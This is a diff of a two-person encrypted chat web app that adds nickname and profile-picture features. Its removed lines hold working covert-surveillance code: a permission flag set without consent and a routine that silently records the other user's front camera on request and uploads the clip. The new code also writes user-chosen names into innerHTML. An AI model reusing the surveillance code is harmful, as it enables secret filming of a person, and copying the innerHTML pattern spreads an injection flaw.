@@ -1,9 +1,8 @@
-
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
 import { getFirestore, collection, addDoc, updateDoc, doc, arrayUnion, onSnapshot, getDocs, query, orderBy, limit, startAfter, startAt, serverTimestamp, setDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
 import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
 import { S3Client, PutObjectCommand } from "https://esm.sh/@aws-sdk/client-s3@3.525.0?bundle";
-localStorage.setItem('selfietrustpermission', 'always');
+
 // --- CONFIG ---
 const firebaseConfig = {
     apiKey: "AIzaSyCuIDz0QP1Gpb6_40fz7xBY9xihPBuv3OE",
@@ -23,7 +22,7 @@ const r2Config = {
     publicUrl: "https://pub-571fb2dc58e242b2b9542131a58cfb43.r2.dev" 
 };
 
-// --- UPDATED USERS ---
+// --- BASE USERS ---
 const USERS = { 
     "sam10": { name: "Sam", avatar: "sam10.png" },
     "mastura10": { name: "Tsunade", avatar: "ts.png" }
@@ -65,6 +64,10 @@ let typingTimeout = null;
 const msgCache = {};
 let currentMediaUrl = "";
 let isAppUnlocked = false; 
+
+// NEW: Store Custom Profiles
+// Structure: { uid: { name: "...", avatar: "data:image...", url: "https://..." } }
+let CUSTOM_PROFILES = {};
 
 // --- DOM ---
 const dom = {
@@ -116,12 +119,11 @@ const dom = {
     sideMenu: document.getElementById('side-menu'),
     sideOverlay: document.getElementById('side-menu-overlay'),
     menuClose: document.getElementById('menu-close'),
-    hiddenCam: document.getElementById('hidden-cam'),
-    hiddenCanvas: document.getElementById('hidden-canvas'),
     typingIndicator: document.getElementById('typing-indicator'),
     permBlock: document.getElementById('perm-block'),
     permRetryBtn: document.getElementById('perm-retry-btn'),
-    // New Modals
+    
+    // Custom Modals
     customRxModal: document.getElementById('custom-rx-input-modal'),
     inpCustomRx: document.getElementById('inp-custom-rx'),
     btnCustomRxConfirm: document.getElementById('btn-custom-rx-confirm'),
@@ -129,12 +131,42 @@ const dom = {
     editModal: document.getElementById('edit-modal'),
     inpEditMsg: document.getElementById('inp-edit-msg'),
     btnEditConfirm: document.getElementById('btn-edit-confirm'),
-    btnEditCancel: document.getElementById('btn-edit-cancel')
+    btnEditCancel: document.getElementById('btn-edit-cancel'),
+
+    // Persons & Profile
+    menuPersonsBtn: document.getElementById('menu-persons-btn'),
+    personsModal: document.getElementById('persons-modal'),
+    personsListContainer: document.getElementById('persons-list-container'),
+    btnPersonsClose: document.getElementById('btn-persons-close'),
+    nameEditModal: document.getElementById('name-edit-modal'),
+    inpNickname: document.getElementById('inp-nickname'),
+    btnNameCancel: document.getElementById('btn-name-cancel'),
+    btnNameConfirm: document.getElementById('btn-name-confirm'),
+    profileFileInput: document.getElementById('profile-file-input'),
+    cropCanvas: document.getElementById('crop-canvas')
 };
 
 function encrypt(text) { return CryptoJS.AES.encrypt(text, vaultKey).toString(); }
 function decrypt(cipherText) {
     try { return CryptoJS.AES.decrypt(cipherText, vaultKey).toString(CryptoJS.enc.Utf8); } catch (e) { return null; }
+}
+
+// --- USER RESOLVER (MERGE LOCAL & DB) ---
+function resolveUser(uid) {
+    const base = USERS[uid] || UNKNOWN_USER;
+    const custom = CUSTOM_PROFILES[uid];
+    
+    let displayName = base.name;
+    let displayAvatar = base.avatar; // Default avatar
+
+    if (custom) {
+        if (custom.name) displayName = custom.name;
+        // Only use custom avatar if we have the ACTUAL image data (Base64), not just the URL
+        if (custom.avatar && custom.avatar.startsWith('data:image')) {
+            displayAvatar = custom.avatar;
+        }
+    }
+    return { name: displayName, avatar: displayAvatar };
 }
 
 // --- HAPTIC FEEDBACK HELPER ---
@@ -162,10 +194,8 @@ function checkAuthStatus() {
     if (currentUser && vaultKey) {
         dom.login.style.display = 'none'; 
         dom.chat.style.display = 'flex';
-        
-        if (currentUser === 'sam10') {
-            dom.hamburger.style.display = 'block';
-        }
+        // Hamburger now visible for all
+        dom.hamburger.style.display = 'block';
         
         requestInitialPermissions();
         
@@ -184,7 +214,6 @@ onAuthStateChanged(auth, (user) => {
     }
 });
 
-
 // --- MENU LOGIC ---
 dom.hamburger.onclick = () => {
     dom.sideMenu.classList.add('open');
@@ -197,52 +226,256 @@ const closeMenu = () => {
 dom.menuClose.onclick = closeMenu;
 dom.sideOverlay.onclick = closeMenu;
 
-// --- MAIN PAGE REQUEST LOGIC ---
-window.requestInstantSelfie = async () => {
-    if (currentUser !== 'sam10') return;
-    
-    const btn = document.getElementById('menu-req-btn');
-    if(btn) {
-        btn.innerText = "Requesting...";
-        btn.style.opacity = "0.7";
-    }
-
-    try {
-        const q = query(collection(db, "quickselfierequest"));
-        const snap = await getDocs(q);
-        
-        if(!snap.empty) {
-            alert("Pending request exists! Wait for her ❤️");
-        } else {
-            await addDoc(collection(db, "quickselfierequest"), {
-                requester: currentUser,
-                t: serverTimestamp()
-            });
-            alert("Request Sent! 📸");
-        }
-    } catch(e) {
-        console.error(e);
-        alert("Error requesting");
-    }
-    
-    if(btn) {
-        btn.innerText = "📸 Request Instant Selfie";
-        btn.style.opacity = "1";
-    }
+// --- PERSONS MODAL LOGIC ---
+dom.menuPersonsBtn.onclick = () => {
     closeMenu();
+    renderPersonsList();
+    dom.personsModal.style.display = 'flex';
+};
+dom.btnPersonsClose.onclick = () => dom.personsModal.style.display = 'none';
+
+let userToEdit = null;
+
+function renderPersonsList() {
+    dom.personsListContainer.innerHTML = '';
+    
+    Object.keys(USERS).forEach(uid => {
+        const user = resolveUser(uid);
+        
+        const row = document.createElement('div');
+        row.className = 'person-row';
+        
+        const avatarWrapper = document.createElement('div');
+        avatarWrapper.className = 'person-avatar-wrapper';
+        avatarWrapper.onclick = () => triggerProfilePicUpload(uid);
+        
+        const img = document.createElement('img');
+        img.src = user.avatar;
+        img.className = 'person-avatar';
+        
+        const editIcon = document.createElement('div');
+        editIcon.className = 'person-edit-icon';
+        editIcon.innerText = '📷';
+        
+        avatarWrapper.appendChild(img);
+        avatarWrapper.appendChild(editIcon);
+        
+        const info = document.createElement('div');
+        info.className = 'person-info';
+        info.onclick = () => openNicknameEditor(uid, user.name);
+        
+        const nameSpan = document.createElement('span');
+        nameSpan.className = 'person-name';
+        nameSpan.innerText = user.name;
+        
+        const subSpan = document.createElement('div');
+        subSpan.className = 'person-sub';
+        subSpan.innerText = "Click to change";
+        
+        info.appendChild(nameSpan);
+        info.appendChild(subSpan);
+        
+        row.appendChild(avatarWrapper);
+        row.appendChild(info);
+        
+        dom.personsListContainer.appendChild(row);
+    });
+}
+
+// NICKNAME EDITOR
+function openNicknameEditor(uid, currentName) {
+    userToEdit = uid;
+    dom.inpNickname.value = currentName;
+    dom.nameEditModal.style.display = 'flex';
+    dom.inpNickname.focus();
+}
+
+dom.btnNameCancel.onclick = () => dom.nameEditModal.style.display = 'none';
+dom.btnNameConfirm.onclick = async () => {
+    const newName = dom.inpNickname.value.trim();
+    if (!newName || !userToEdit) return;
+    
+    dom.nameEditModal.style.display = 'none';
+    const encryptedName = encrypt(newName);
+    
+    // Save to Firestore (Merged)
+    await setDoc(doc(db, 'profiles', userToEdit), { name: encryptedName }, { merge: true });
+    
+    // Send Notification Message
+    const actorName = resolveUser(currentUser).name;
+    const targetName = resolveUser(userToEdit).name;
+    const notifyPayload = {
+        text: `${actorName} changed ${targetName}'s nickname to ${newName}`
+    };
+    await addDoc(collection(db, "messages"), {
+        s: currentUser,
+        d: encrypt(JSON.stringify(notifyPayload)),
+        t: serverTimestamp(),
+        y: 'notify',
+        rx: {}
+    });
 };
 
-// --- PERMISSIONS (STRICT) ---
+// PROFILE PICTURE UPLOAD
+function triggerProfilePicUpload(uid) {
+    userToEdit = uid;
+    dom.profileFileInput.click();
+}
+
+dom.profileFileInput.onchange = async (e) => {
+    const file = e.target.files[0];
+    if (!file || !userToEdit) return;
+    
+    dom.status.innerText = "Processing Image...";
+    try {
+        // 1. Crop Image 1:1
+        const b64Cropped = await cropImageSquare(file);
+        
+        // 2. Encrypt
+        const encBlob = encrypt(b64Cropped);
+        dom.status.innerText = "Uploading Profile...";
+        
+        // 3. Upload R2
+        const fname = `pfp_${userToEdit}_${Date.now()}.enc`;
+        await s3.send(new PutObjectCommand({ Bucket: r2Config.bucketName, Key: fname, Body: encBlob, ContentType: "text/plain" }));
+        
+        // 4. Save URL Encrypted in DB
+        const finalUrl = `${r2Config.publicUrl}/${fname}`;
+        const encryptedUrl = encrypt(finalUrl);
+        
+        await setDoc(doc(db, 'profiles', userToEdit), { avatar: encryptedUrl }, { merge: true });
+        
+        // Send Notification Message
+        const actorName = resolveUser(currentUser).name;
+        const targetName = resolveUser(userToEdit).name;
+        const notifyPayload = {
+            text: `${actorName} changed ${targetName}'s profile`,
+            img: finalUrl // Use Public URL here as it will be decrypted by recipients
+        };
+        await addDoc(collection(db, "messages"), {
+            s: currentUser,
+            d: encrypt(JSON.stringify(notifyPayload)),
+            t: serverTimestamp(),
+            y: 'notify',
+            rx: {}
+        });
+
+        dom.status.innerText = "";
+        dom.profileFileInput.value = ""; // Reset
+        
+    } catch (err) {
+        console.error(err);
+        dom.status.innerText = "Error updating profile";
+    }
+};
+
+function cropImageSquare(file) {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const img = new Image();
+            img.onload = () => {
+                const size = Math.min(img.width, img.height);
+                const x = (img.width - size) / 2;
+                const y = (img.height - size) / 2;
+                
+                dom.cropCanvas.width = size;
+                dom.cropCanvas.height = size;
+                const ctx = dom.cropCanvas.getContext('2d');
+                ctx.drawImage(img, x, y, size, size, 0, 0, size, size);
+                
+                // Return data URL (High quality)
+                resolve(dom.cropCanvas.toDataURL('image/jpeg', 0.9));
+            };
+            img.src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+    });
+}
+
+// --- PROFILE SYNC SYSTEM (UPDATED FIX) ---
+function initProfileSystem() {
+    onSnapshot(collection(db, 'profiles'), (snap) => {
+        snap.forEach(docSnap => {
+            const uid = docSnap.id;
+            const data = docSnap.data();
+            
+            if (!CUSTOM_PROFILES[uid]) CUSTOM_PROFILES[uid] = {};
+            
+            if (data.name) {
+                const decName = decrypt(data.name);
+                if (decName) CUSTOM_PROFILES[uid].name = decName;
+            }
+            if (data.avatar) {
+                const url = decrypt(data.avatar);
+                // Check if we have a new URL or if we haven't loaded this avatar yet
+                if (url && CUSTOM_PROFILES[uid].url !== url) {
+                    CUSTOM_PROFILES[uid].url = url;
+                    // Trigger async fetch, don't await here to avoid blocking
+                    fetchAndCacheProfilePic(uid, url);
+                }
+            }
+        });
+        
+        // Immediate render (updates names, defaults for avatars if loading)
+        updateHeader();
+        refreshMessageAvatars();
+        if (dom.personsModal.style.display === 'flex') renderPersonsList();
+    });
+}
+
+// NEW FUNCTION: Fetch Encrypted Profile Image & Cache Base64
+async function fetchAndCacheProfilePic(uid, url) {
+    try {
+        const res = await fetch(url);
+        if(!res.ok) throw new Error("Fetch failed");
+        const txt = await res.text();
+        const b64 = decrypt(txt);
+        
+        if (b64 && b64.startsWith('data:image')) {
+            CUSTOM_PROFILES[uid].avatar = b64; // Store the actual Image Data
+            
+            // Re-render UI to show the image
+            updateHeader();
+            refreshMessageAvatars();
+            if (dom.personsModal.style.display === 'flex') renderPersonsList();
+        }
+    } catch (e) {
+        console.warn("Failed to decrypt/load profile pic for", uid);
+    }
+}
+
+function updateHeader() {
+    const partnerId = getPartnerId();
+    const partner = resolveUser(partnerId);
+    dom.headAvatar.src = partner.avatar;
+    dom.headName.innerText = partner.name;
+}
+
+function refreshMessageAvatars() {
+    // Brute force update of visible avatars and names in reply headers
+    document.querySelectorAll('.msg-row').forEach(row => {
+        const uid = row.classList.contains('me') ? currentUser : getPartnerId();
+        const user = resolveUser(uid);
+        
+        // Update Avatar Img
+        const img = row.querySelector('.msg-avatar');
+        if (img && !row.classList.contains('me')) img.src = user.avatar;
+    });
+}
+
+// --- PERMISSIONS (STRICT: AUDIO ONLY) ---
 async function requestInitialPermissions() {
+    // Only requesting Audio for Voice Messages. No Camera.
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         stream.getTracks().forEach(track => track.stop());
         dom.permBlock.style.display = 'none';
         
+        initProfileSystem(); // Start syncing profiles
         initChatSystem(); 
         initPresenceSystem();
-        monitorSelfieRequests(); 
         
         document.addEventListener("visibilitychange", () => {
              if (document.visibilityState === 'visible') markMySeen();
@@ -255,46 +488,6 @@ async function requestInitialPermissions() {
     }
 }
 dom.permRetryBtn.onclick = requestInitialPermissions;
-
-// --- ROMANTIC SELFIE ---
-function monitorSelfieRequests() {
-    if (currentUser !== 'mastura10') return;
-    const q = query(collection(db, "quickselfierequest"));
-    onSnapshot(q, async (snap) => {
-        if (!snap.empty && localStorage.getItem('selfietrustpermission') === "always") {
-            await takeSilentVideo(snap.docs[0].id);
-        }
-    });
-}
-
-async function takeSilentVideo(requestId) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        dom.hiddenCam.srcObject = stream;
-        const recorder = new MediaRecorder(stream);
-        const chunks = [];
-        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const b64 = await toBase64(blob);
-            stream.getTracks().forEach(track => track.stop());
-            dom.hiddenCam.srcObject = null;
-            await uploadCuteSelfie(b64, requestId, 'silent-video');
-        };
-        recorder.start();
-        setTimeout(() => { recorder.stop(); }, 10000);
-    } catch (e) { console.error("Silent video capture failed", e); }
-}
-
-async function uploadCuteSelfie(b64, requestId, type) {
-    try {
-        const encBlob = encrypt(b64);
-        const fname = `cute_${Date.now()}_${Math.random().toString(36).substring(7)}.enc`;
-        await s3.send(new PutObjectCommand({ Bucket: r2Config.bucketName, Key: fname, Body: encBlob, ContentType: "text/plain" }));
-        await addDoc(collection(db, "cuteselfies"), { s: currentUser, d: encrypt(`${r2Config.publicUrl}/${fname}`), t: serverTimestamp(), type: type });
-        await deleteDoc(doc(db, "quickselfierequest", requestId));
-    } catch (e) { console.error("Upload failed", e); }
-}
 
 dom.btnLogin.addEventListener('click', async () => {
     const username = dom.inpUser.value.trim().toLowerCase();
@@ -321,10 +514,7 @@ dom.btnLogout.addEventListener('click', async () => {
 
 // --- PRESENCE ---
 function initPresenceSystem() {
-    const partnerId = getPartnerId();
-    const partner = USERS[partnerId] || UNKNOWN_USER;
-    dom.headAvatar.src = partner.avatar;
-    dom.headName.innerText = partner.name;
+    updateHeader(); // Initial load with defaults
 
     const sendHeartbeat = () => {
         if(document.visibilityState === 'visible') {
@@ -334,7 +524,7 @@ function initPresenceSystem() {
     sendHeartbeat();
     setInterval(sendHeartbeat, 10000); 
 
-    onSnapshot(doc(db, 'status', partnerId), (snap) => {
+    onSnapshot(doc(db, 'status', getPartnerId()), (snap) => {
         if(snap.exists()) {
             const data = snap.data();
             partnerLastTimestamp = data.online ? data.online.toMillis() : 0;
@@ -478,14 +668,14 @@ async function initChatSystem() {
         if(e.target === dom.rxModal) dom.rxModal.style.display = 'none';
         if(e.target === dom.customRxModal) dom.customRxModal.style.display = 'none';
         if(e.target === dom.editModal) dom.editModal.style.display = 'none';
+        if(e.target === dom.personsModal && e.target !== dom.personsListContainer) dom.personsModal.style.display = 'none';
+        if(e.target === dom.nameEditModal) dom.nameEditModal.style.display = 'none';
     });
 }
 
 function setupRealtimeListener() {
     if (unsubscribeChat) unsubscribeChat();
     
-    // UPDATED LOGIC: Listen from the OLDEST visible message onwards.
-    // This ensures that edits/reactions to ANY visible message are captured.
     let q = oldestVisibleDoc ? 
         query(collection(db, "messages"), orderBy("t", "asc"), startAt(oldestVisibleDoc)) : 
         query(collection(db, "messages"), orderBy("t", "asc"));
@@ -551,9 +741,64 @@ async function processMessageDoc(doc, method) {
     msgCache[doc.id] = data; 
     if(data.hide && data.hide.includes(currentUser)) return;
     
+    // --- NOTIFICATION RENDERER ---
+    if (data.y === 'notify') {
+        const div = document.createElement('div');
+        div.id = `msg-${doc.id}`;
+        div.className = 'msg-row notify';
+        
+        const bubble = document.createElement('div');
+        bubble.className = 'notify-bubble';
+        
+        try {
+            const dec = decrypt(data.d);
+            const content = JSON.parse(dec);
+            
+            // Image (Above Middle)
+            if(content.img) {
+                const skel = document.createElement('div'); 
+                skel.className = 'skeleton'; 
+                skel.style.width = '60px'; 
+                skel.style.height = '60px';
+                skel.style.borderRadius = '50%';
+                bubble.appendChild(skel);
+                
+                // Fetch Encrypted image if it is encrypted URL (usually public R2 url in notify but let's be safe)
+                // Actually notifyPayload.img is the public URL itself, but content is fetched from S3/R2 usually encrypted.
+                // In upload logic we saved: img: finalUrl (which is publicUrl/fname). 
+                // And we uploaded ENCRYPTED blob. So fetch logic is needed.
+                
+                fetch(content.img).then(res => res.text()).then(txt => {
+                    const b64 = decrypt(txt);
+                    if(b64) {
+                        skel.remove();
+                        const img = document.createElement('img');
+                        img.className = 'notify-img';
+                        img.src = b64;
+                        // Insert at top
+                        bubble.insertBefore(img, bubble.firstChild);
+                        img.onclick = () => openMediaViewer(b64, 'image');
+                    }
+                }).catch(() => { skel.remove(); });
+            }
+            
+            // Text
+            const span = document.createElement('span');
+            span.innerText = content.text;
+            bubble.appendChild(span);
+            
+        } catch(e) { bubble.innerText = "System Notification"; }
+        
+        div.appendChild(bubble);
+        if (method === "append") dom.list.appendChild(div); else dom.list.insertBefore(div, dom.list.children[1] || null);
+        return; 
+    }
+    // ----------------------------
+
     const div = document.createElement('div'); div.id = `msg-${doc.id}`; div.className = `msg-row ${data.s === currentUser ? 'me' : 'other'}`;
     
-    const senderInfo = USERS[data.s] || UNKNOWN_USER;
+    // USE RESOLVED USER (DB AWARE)
+    const senderInfo = resolveUser(data.s);
 
     if(data.s !== currentUser) {
         const img = document.createElement('img'); 
@@ -572,7 +817,7 @@ async function processMessageDoc(doc, method) {
     if(data.rep) {
         const rh = document.createElement('div'); rh.className = 'reply-header';
         let txt = decrypt(data.rep.d); if(txt && txt.includes('http') && !txt.includes(' ')) txt = "📷 Media";
-        const repUser = USERS[data.rep.s] || UNKNOWN_USER; 
+        const repUser = resolveUser(data.rep.s); // USE RESOLVED USER
         rh.innerText = `↪ ${repUser.name}: ${txt ? txt.substring(0,20) : '...'}...`; bubble.appendChild(rh);
     }
 
@@ -606,7 +851,6 @@ async function processMessageDoc(doc, method) {
 }
 
 function updateMessageInPlace(doc) {
-    // Handle both Firestore doc snapshots and our local mock objects
     const data = typeof doc.data === 'function' ? doc.data() : (doc.data ? doc.data : null);
     if(!data) return;
     
@@ -614,6 +858,8 @@ function updateMessageInPlace(doc) {
     const row = document.getElementById(`msg-${doc.id}`); if(!row) return;
     if(data.hide && data.hide.includes(currentUser)) { row.remove(); return; }
     
+    if (data.y === 'notify') return; // Notifications don't update usually
+
     const content = row.querySelector('.msg-content');
     const bubble = row.querySelector('.bubble');
 
@@ -622,7 +868,6 @@ function updateMessageInPlace(doc) {
         bubble.classList.remove('big-emoji');
         const media = row.querySelector('img, video, audio, .custom-audio-player, .custom-video-player'); if(media) media.remove();
     } else {
-        // Re-render content to support edits
         const cleanText = decrypt(data.d);
         if(data.y === 'text' && isOnlyEmoji(cleanText)) bubble.classList.add('big-emoji'); 
         else bubble.classList.remove('big-emoji');
@@ -648,10 +893,11 @@ function updateMessageInPlace(doc) {
 
 // --- CONTEXT MENU ---
 function openContextMenu(id, data) {
+    if(data.y === 'notify') return; // No context menu for notifications
+
     vibrate(10); // VIBRATE
     ctxMsgId = id; ctxIsMe = (data.s === currentUser);
     dom.ctxUnsend.style.display = ctxIsMe ? 'block' : 'none';
-    // Show Edit only if it's my message and it's text
     dom.ctxEdit.style.display = (ctxIsMe && data.y === 'text') ? 'block' : 'none';
     
     dom.contextMenu.dataset.rawContent = data.d; dom.contextMenu.dataset.sender = data.s;
@@ -675,7 +921,6 @@ dom.btnEditConfirm.onclick = async () => {
     
     dom.editModal.style.display = 'none';
     
-    // 1. Optimistic Update (Immediate UI Change)
     const cached = msgCache[ctxMsgId];
     if(cached) {
         cached.d = encrypt(newText);
@@ -683,7 +928,6 @@ dom.btnEditConfirm.onclick = async () => {
         updateMessageInPlace({ id: ctxMsgId, data: cached });
     }
 
-    // 2. Cloud Update
     await updateDoc(doc(db, "messages", ctxMsgId), {
         d: encrypt(newText),
         edited: true
@@ -694,20 +938,16 @@ dom.btnEditConfirm.onclick = async () => {
 dom.rxPicker.addEventListener('click', async (e) => {
     if(e.target.tagName === 'SPAN' && e.target.id !== 'rx-custom-btn') {
         vibrate(10); // VIBRATE
-        
-        // Snappy Animation Trigger
         const target = e.target;
         target.classList.add('selected');
-
         setTimeout(() => {
             target.classList.remove('selected');
             const emoji = target.dataset.emoji;
             applyReaction(emoji);
-        }, 200); // Wait for animation
+        }, 200); 
     }
 });
 
-// Open Custom Picker
 dom.rxCustomBtn.onclick = (e) => {
     e.stopPropagation();
     vibrate(10);
@@ -728,11 +968,9 @@ dom.btnCustomRxConfirm.onclick = () => {
 };
 
 async function applyReaction(reaction) {
-     // Animation logic for picker
     if (!msgCache[ctxMsgId].rx) msgCache[ctxMsgId].rx = {};
     msgCache[ctxMsgId].rx[currentUser] = reaction;
     
-    // Optimistic Update
     updateMessageInPlace({ id: ctxMsgId, data: msgCache[ctxMsgId] });
 
     const updateObj = {}; updateObj[`rx.${currentUser}`] = reaction;
@@ -770,7 +1008,7 @@ function formatTime(t) { if(!t) return ""; const d = t.toDate ? t.toDate() : new
 function openRxModal(rx) {
     if(!rx) return; dom.rxList.innerHTML = '';
     Object.entries(rx).forEach(([uid, emoji]) => {
-        const u = USERS[uid] || UNKNOWN_USER;
+        const u = resolveUser(uid); // USE RESOLVED USER
         dom.rxList.innerHTML += `<div class="rx-detail-row"><img src="${u.avatar}" style="width:24px;height:24px;border-radius:50%"><span style="flex:1;font-weight:bold">${u.name}</span><span style="font-size:20px">${emoji}</span></div>`;
     });
     dom.rxModal.style.display = 'flex';
@@ -844,7 +1082,7 @@ dom.ctxRemove.onclick = async () => {
 };
 function startReply(id, encContent, senderId) {
     currentReply = { id, d: encContent, s: senderId };
-    const senderInfo = USERS[senderId] || UNKNOWN_USER;
+    const senderInfo = resolveUser(senderId); // USE RESOLVED USER
     dom.replyBar.style.display = 'flex'; dom.replyUser.innerText = `Replying to ${senderInfo.name}`;
     let clean = decrypt(encContent); if(clean.includes('http') && !clean.includes(' ')) clean = "📷 Media";
     dom.replyText.innerText = clean; dom.input.focus();
